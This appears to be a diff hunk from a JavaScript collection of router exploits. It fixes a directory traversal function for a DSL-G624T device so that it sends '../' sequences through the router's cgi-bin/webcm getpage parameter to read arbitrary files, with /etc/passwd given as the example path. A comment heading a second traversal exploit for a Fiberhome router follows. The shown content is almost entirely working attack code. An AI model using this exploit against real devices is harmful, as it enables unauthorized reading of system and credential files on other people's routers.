@@ -182,7 +182,7 @@ function dslg624t_dirtraversal(ip)
 {
 	ip = ip || "192.168.1.1";
 	path = prompt("Path: (ex: /etc/passwd)");
-	document.location = "http://" + ip + "/cgi-bin/webcm?getpage=/././././././." + path;
+	document.location = "http://" + ip + "/cgi-bin/webcm?getpage=/../../../../../../.." + path;
 }
 
 // Fiberhome HG-110 - Directory Traversal
